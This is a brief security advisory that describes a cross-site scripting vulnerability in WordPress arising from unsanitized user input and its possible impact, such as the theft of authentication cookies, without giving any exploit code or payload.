WordPress is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
